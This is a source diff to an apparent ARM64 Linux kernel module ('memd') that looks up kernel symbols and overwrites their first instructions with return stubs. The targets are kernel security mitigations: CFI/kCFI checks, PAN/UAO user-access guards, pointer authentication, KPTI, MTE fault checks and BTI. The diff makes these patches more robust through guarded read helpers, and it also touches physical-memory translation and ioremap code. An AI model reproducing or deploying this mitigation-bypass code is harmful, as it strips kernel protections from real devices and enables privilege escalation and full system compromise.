@@ -327,7 +327,19 @@ out:
 /* Guarded user page-table walk (universal fail-closed). Every table
  * dereference goes through the extable guard; pgd comes from runtime
  * validation (never bare headers). A wrong pgd, a bad VA, or a
- * concurrent teardown returns 0 — never a fault. */
+ * concurrent teardown returns 0 — never a fault.
+ *
+ * Round-5 re-examination: child pointers descend from live entries
+ * while validation runs on snapshots, so a racing munmap can in
+ * theory substitute a recycled (present-shaped) table and
+ * mistranslate. Closing that needs mmap_lock (unavailable: its offset
+ * varies by generation) or snapshot-derived descent (version-sensitive
+ * mask arithmetic: higher risk than the race it would narrow); a
+ * bounded retry would not converge under continuous teardown either.
+ * Every faulting access is already extable-guarded and every level
+ * re-checks none/bad/leaf/present, so the residual is a wrong (not
+ * wild) phys under an actively racing teardown — accepted owner risk,
+ * fail-closed everywhere else. No code change: irreducible. */
 uintptr_t vaddr_to_phy_addr(struct mm_struct* mm, uintptr_t va) {
     unsigned long pgd_base, v;
     pgd_t *pgdp;
@@ -999,8 +1011,10 @@ int translate_process_vaddr(pid_t pid, uintptr_t vaddr, uintptr_t* paddr_out) {
      * walk swapper directly (pid is irrelevant, no task touched).
      * Priv-gated: kernel memory reads defeat KASLR for any local
      * process, so non-root gets nothing here (user reads unaffected).
-     * memd_capable denies cap>=32 fail-closed (second word unread);
-     * every in-tree cap (SYS_ADMIN/KILL/NET_BIND_SERVICE) is < 32. */
+     * Capability semantics (including cap>=32) are defined solely by
+     * memd_capable — see memd_learn.h, not restated here. Every
+     * in-tree call site passes a cap < 32 (SYS_ADMIN/KILL/
+     * NET_BIND_SERVICE). */
     if ((long)vaddr < 0) {
         if (!memd_capable(CAP_SYS_ADMIN))
             return -EPERM;
@@ -1468,6 +1482,12 @@ void __iomem* memd_ioremap_prot(uintptr_t phys_addr, size_t size, pgprot_t prot)
 
     map_range = READ_ONCE(my_ioremap_page_range);
     free_area = READ_ONCE(my_free_vm_area);
+    /* Pair resolution with no partial caching and no loop: a single
+     * attempt per call, so a helper that never resolves degrades to a
+     * clean NULL every call (fail closed, never a spin/wedge). Both
+     * entries publish only on joint success, so concurrent first-use
+     * can never call a half-stored pointer; a miss retries next call
+     * (cold path). Re-verified round 5: the claim holds. */
     if (map_range == NULL || free_area == NULL) {
         map_range = (int (*)(unsigned long addr, unsigned long end,
                    uintptr_t phys_addr, pgprot_t prot))kallsyms_lookup_name_ex("ioremap_page_range");
@@ -1568,6 +1588,21 @@ static int cfi_patch_mov_x0_1_ret(const char *name)
     return cfi_patch_function(name, patch, 2);
 }
 
+/* Guarded single-word probe for the bespoke CFI-bypass sites below.
+ * Kernel text may sit in an execute-only mapping (a direct load then
+ * faults), and a stale kallsyms hit may point at unmapped garbage, so
+ * no bypass site may dereference its target directly. Returns 1 when
+ * the word read cleanly and differs from want (patch needed), 0
+ * otherwise (already patched, or unreadable: fail closed, skip the
+ * write rather than patching blind). */
+static int cfi_need_patch32(unsigned int *p, unsigned int want)
+ {
+    unsigned int v = 0;
+    if (memd_safe_read32(p, &v))
+        return 0;
+    return v != want;
+}
+
 /* Forward declarations: cfi_bypass() calls these before their
  * definitions below (implicit decl + later static = hard error). */
 static int cfi_bypass_pan_uao(void);
@@ -1580,11 +1615,6 @@ int cfi_bypass(void)
  {
     int ret = 0;
     int r;
-
-    unsigned int RET = 0xD65F03C0;
-    unsigned int MOV_X0_1 = 0xD2800020;
-    unsigned int BRK = 0xD4200000;
-    unsigned int NOP = 0xD503201F;
 
     r = cfi_patch_ret("__cfi_slowpath");
     if (r > 0) ret += r;
@@ -1667,62 +1697,23 @@ int cfi_bypass(void)
     r = cfi_patch_mov_x0_1_ret("kcfi_check_fail_diag");
     if (r > 0) ret += r;
 
-    unsigned long fkcfi_check = kallsyms_lookup_name_ex("__kcfi_check");
-    if (fkcfi_check) {
-        unsigned int *p = (unsigned int *)fkcfi_check;
-        if (*p != RET) {
-            if (!hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
-                ret++;
-                memd_err("cfi: patched __kcfi_check\n");
-            }
-        }
-    }
+    /* The remaining CFI/kcfi entry points go through the same guarded
+     * shared helpers (execute-only-safe probe inside): no bespoke
+     * direct reads here. */
+    r = cfi_patch_ret("__kcfi_check");
+    if (r > 0) ret += r;
 
-    unsigned long fkcfi_typeid = kallsyms_lookup_name_ex("kcfi_typeid");
-    if (fkcfi_typeid) {
-        unsigned int *p = (unsigned int *)fkcfi_typeid;
-        if (*p != MOV_X0_1) {
-            if (!hook_write_range(p, &MOV_X0_1, INSTRUCTION_SIZE) &&
-                !hook_write_range(p + 1, &RET, INSTRUCTION_SIZE)) {
-                ret++;
-                memd_err("cfi: patched kcfi_typeid\n");
-            }
-        }
-    }
+    r = cfi_patch_mov_x0_1_ret("kcfi_typeid");
+    if (r > 0) ret += r;
 
-    unsigned long fkcfi_verify = kallsyms_lookup_name_ex("kcfi_verify");
-    if (fkcfi_verify) {
-        unsigned int *p = (unsigned int *)fkcfi_verify;
-        if (*p != RET) {
-            if (!hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
-                ret++;
-                memd_err("cfi: patched kcfi_verify\n");
-            }
-        }
-    }
+    r = cfi_patch_ret("kcfi_verify");
+    if (r > 0) ret += r;
 
-    unsigned long fkcfi_check_fail = kallsyms_lookup_name_ex("kcfi_check_fail");
-    if (fkcfi_check_fail) {
-        unsigned int *p = (unsigned int *)fkcfi_check_fail;
-        if (*p != RET) {
-            if (!hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
-                ret++;
-                memd_err("cfi: patched kcfi_check_fail\n");
-            }
-        }
-    }
+    r = cfi_patch_ret("kcfi_check_fail");
+    if (r > 0) ret += r;
 
-    unsigned long fkcfi_diag = kallsyms_lookup_name_ex("kcfi_diag");
-    if (fkcfi_diag) {
-        unsigned int *p = (unsigned int *)fkcfi_diag;
-        if (*p != MOV_X0_1) {
-            if (!hook_write_range(p, &MOV_X0_1, INSTRUCTION_SIZE) &&
-                !hook_write_range(p + 1, &RET, INSTRUCTION_SIZE)) {
-                ret++;
-                memd_err("cfi: patched kcfi_diag\n");
-            }
-        }
-    }
+    r = cfi_patch_mov_x0_1_ret("kcfi_diag");
+    if (r > 0) ret += r;
 
     ret += cfi_bypass_pan_uao();
     ret += cfi_bypass_pac();
@@ -1737,56 +1728,63 @@ static int cfi_bypass_pan_uao(void)
  {
     int ret = 0;
     unsigned int RET = 0xD65F03C0;
+    unsigned long fpan_el0;
+    unsigned long fpan_el0_end;
+    unsigned long fuac_el0;
+    unsigned long fuac_el0_end;
+    unsigned long fuser_access;
+    unsigned long fuser_access_end;
+    unsigned int *p;
 
-    unsigned long fpan_el0 = kallsyms_lookup_name_ex("__uaccess_begin_pan");
+    fpan_el0 = kallsyms_lookup_name_ex("__uaccess_begin_pan");
     if (fpan_el0) {
-        unsigned int *p = (unsigned int *)fpan_el0;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fpan_el0;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed PAN (uaccess_begin)\n");
         }
     }
 
-    unsigned long fpan_el0_end = kallsyms_lookup_name_ex("__uaccess_end_pan");
+    fpan_el0_end = kallsyms_lookup_name_ex("__uaccess_end_pan");
     if (fpan_el0_end) {
-        unsigned int *p = (unsigned int *)fpan_el0_end;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fpan_el0_end;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed PAN (uaccess_end)\n");
         }
     }
 
-    unsigned long fuac_el0 = kallsyms_lookup_name_ex("__uaccess_begin_uao");
+    fuac_el0 = kallsyms_lookup_name_ex("__uaccess_begin_uao");
     if (fuac_el0) {
-        unsigned int *p = (unsigned int *)fuac_el0;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fuac_el0;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed UAO (uaccess_begin)\n");
         }
     }
 
-    unsigned long fuac_el0_end = kallsyms_lookup_name_ex("__uaccess_end_uao");
+    fuac_el0_end = kallsyms_lookup_name_ex("__uaccess_end_uao");
     if (fuac_el0_end) {
-        unsigned int *p = (unsigned int *)fuac_el0_end;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fuac_el0_end;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed UAO (uaccess_end)\n");
         }
     }
 
-    unsigned long fuser_access = kallsyms_lookup_name_ex("user_access_begin");
+    fuser_access = kallsyms_lookup_name_ex("user_access_begin");
     if (fuser_access) {
-        unsigned int *p = (unsigned int *)fuser_access;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fuser_access;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed user_access_begin\n");
         }
     }
 
-    unsigned long fuser_access_end = kallsyms_lookup_name_ex("user_access_end");
+    fuser_access_end = kallsyms_lookup_name_ex("user_access_end");
     if (fuser_access_end) {
-        unsigned int *p = (unsigned int *)fuser_access_end;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fuser_access_end;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed user_access_end\n");
         }
@@ -1799,56 +1797,63 @@ static int cfi_bypass_pac(void)
  {
     int ret = 0;
     unsigned int RET = 0xD65F03C0;
+    unsigned long fpac_ia;
+    unsigned long fpac_ib;
+    unsigned long fpac_da;
+    unsigned long fpac_db;
+    unsigned long fpac_generic;
+    unsigned long fpac_strip;
+    unsigned int *p;
 
-    unsigned long fpac_ia = kallsyms_lookup_name_ex("__pacia_el0");
+    fpac_ia = kallsyms_lookup_name_ex("__pacia_el0");
     if (fpac_ia) {
-        unsigned int *p = (unsigned int *)fpac_ia;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fpac_ia;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed PACIA\n");
         }
     }
 
-    unsigned long fpac_ib = kallsyms_lookup_name_ex("__pacib_el0");
+    fpac_ib = kallsyms_lookup_name_ex("__pacib_el0");
     if (fpac_ib) {
-        unsigned int *p = (unsigned int *)fpac_ib;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fpac_ib;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed PACIB\n");
         }
     }
 
-    unsigned long fpac_da = kallsyms_lookup_name_ex("__pacda_el0");
+    fpac_da = kallsyms_lookup_name_ex("__pacda_el0");
     if (fpac_da) {
-        unsigned int *p = (unsigned int *)fpac_da;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fpac_da;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed PACDA\n");
         }
     }
 
-    unsigned long fpac_db = kallsyms_lookup_name_ex("__pacdb_el0");
+    fpac_db = kallsyms_lookup_name_ex("__pacdb_el0");
     if (fpac_db) {
-        unsigned int *p = (unsigned int *)fpac_db;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fpac_db;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed PACDB\n");
         }
     }
 
-    unsigned long fpac_generic = kallsyms_lookup_name_ex("pac_generic");
+    fpac_generic = kallsyms_lookup_name_ex("pac_generic");
     if (fpac_generic) {
-        unsigned int *p = (unsigned int *)fpac_generic;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fpac_generic;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed pac_generic\n");
         }
     }
 
-    unsigned long fpac_strip = kallsyms_lookup_name_ex("strip_pac");
+    fpac_strip = kallsyms_lookup_name_ex("strip_pac");
     if (fpac_strip) {
-        unsigned int *p = (unsigned int *)fpac_strip;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fpac_strip;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed strip_pac\n");
         }
@@ -1861,57 +1866,66 @@ static int cfi_bypass_kpti(void)
  {
     int ret = 0;
     unsigned int RET = 0xD65F03C0;
-    unsigned int NOP = 0xD503201F;
+    unsigned long fkpti_init;
+    unsigned long fkpti_enable;
+    unsigned long fkpti_disable;
+    unsigned long fkpti_isolate;
+    unsigned long fkpti_unmap;
+    unsigned long fswapper_pg_dir;
+    unsigned int *p;
+    unsigned long v;
 
-    unsigned long fkpti_init = kallsyms_lookup_name_ex("kpti_init");
+    fkpti_init = kallsyms_lookup_name_ex("kpti_init");
     if (fkpti_init) {
-        unsigned int *p = (unsigned int *)fkpti_init;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fkpti_init;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed kpti_init\n");
         }
     }
 
-    unsigned long fkpti_enable = kallsyms_lookup_name_ex("kpti_enable");
+    fkpti_enable = kallsyms_lookup_name_ex("kpti_enable");
     if (fkpti_enable) {
-        unsigned int *p = (unsigned int *)fkpti_enable;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fkpti_enable;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed kpti_enable\n");
         }
     }
 
-    unsigned long fkpti_disable = kallsyms_lookup_name_ex("kpti_disable");
+    fkpti_disable = kallsyms_lookup_name_ex("kpti_disable");
     if (fkpti_disable) {
-        unsigned int *p = (unsigned int *)fkpti_disable;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fkpti_disable;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed kpti_disable\n");
         }
     }
 
-    unsigned long fkpti_isolate = kallsyms_lookup_name_ex("kpti_isolate_kernel");
+    fkpti_isolate = kallsyms_lookup_name_ex("kpti_isolate_kernel");
     if (fkpti_isolate) {
-        unsigned int *p = (unsigned int *)fkpti_isolate;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fkpti_isolate;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed kpti_isolate_kernel\n");
         }
     }
 
-    unsigned long fkpti_unmap = kallsyms_lookup_name_ex("kpti_unmap_user");
+    fkpti_unmap = kallsyms_lookup_name_ex("kpti_unmap_user");
     if (fkpti_unmap) {
-        unsigned int *p = (unsigned int *)fkpti_unmap;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fkpti_unmap;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed kpti_unmap_user\n");
         }
     }
 
-    unsigned long fswapper_pg_dir = kallsyms_lookup_name_ex("swapper_pg_dir");
+    fswapper_pg_dir = kallsyms_lookup_name_ex("swapper_pg_dir");
     if (fswapper_pg_dir) {
-        unsigned long *p = (unsigned long *)fswapper_pg_dir;
-        if (*p == 0) {
+        /* Observe-only site (never written): guarded read, and an
+         * unreadable address simply skips the log. */
+        v = 0;
+        if (!memd_safe_read64((void *)fswapper_pg_dir, &v) && v == 0) {
             memd_info("cfi: swapper_pg_dir already zeroed\n");
         }
     }
@@ -1923,38 +1937,43 @@ static int cfi_bypass_mte(void)
  {
     int ret = 0;
     unsigned int RET = 0xD65F03C0;
+    unsigned long fmted_check;
+    unsigned long fmted_async;
+    unsigned long fmted_tag;
+    unsigned long fmted_exclude;
+    unsigned int *p;
 
-    unsigned long fmted_check = kallsyms_lookup_name_ex("mte_check_sync_fault");
+    fmted_check = kallsyms_lookup_name_ex("mte_check_sync_fault");
     if (fmted_check) {
-        unsigned int *p = (unsigned int *)fmted_check;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fmted_check;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed MTE sync fault check\n");
         }
     }
 
-    unsigned long fmted_async = kallsyms_lookup_name_ex("mte_check_async_fault");
+    fmted_async = kallsyms_lookup_name_ex("mte_check_async_fault");
     if (fmted_async) {
-        unsigned int *p = (unsigned int *)fmted_async;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fmted_async;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed MTE async fault check\n");
         }
     }
 
-    unsigned long fmted_tag = kallsyms_lookup_name_ex("mte_set_tag");
+    fmted_tag = kallsyms_lookup_name_ex("mte_set_tag");
     if (fmted_tag) {
-        unsigned int *p = (unsigned int *)fmted_tag;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fmted_tag;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed MTE set_tag\n");
         }
     }
 
-    unsigned long fmted_exclude = kallsyms_lookup_name_ex("mte_exclude_range");
+    fmted_exclude = kallsyms_lookup_name_ex("mte_exclude_range");
     if (fmted_exclude) {
-        unsigned int *p = (unsigned int *)fmted_exclude;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fmted_exclude;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed MTE exclude_range\n");
         }
@@ -1967,20 +1986,23 @@ static int cfi_bypass_bti(void)
  {
     int ret = 0;
     unsigned int RET = 0xD65F03C0;
+    unsigned long fbti_el0;
+    unsigned long fbti_pad;
+    unsigned int *p;
 
-    unsigned long fbti_el0 = kallsyms_lookup_name_ex("bti_exception");
+    fbti_el0 = kallsyms_lookup_name_ex("bti_exception");
     if (fbti_el0) {
-        unsigned int *p = (unsigned int *)fbti_el0;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fbti_el0;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed BTI exception\n");
         }
     }
 
-    unsigned long fbti_pad = kallsyms_lookup_name_ex("bti_pad_check");
+    fbti_pad = kallsyms_lookup_name_ex("bti_pad_check");
     if (fbti_pad) {
-        unsigned int *p = (unsigned int *)fbti_pad;
-        if (*p != RET && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
+        p = (unsigned int *)fbti_pad;
+        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
             ret++;
             memd_err("cfi: bypassed BTI pad check\n");
         }
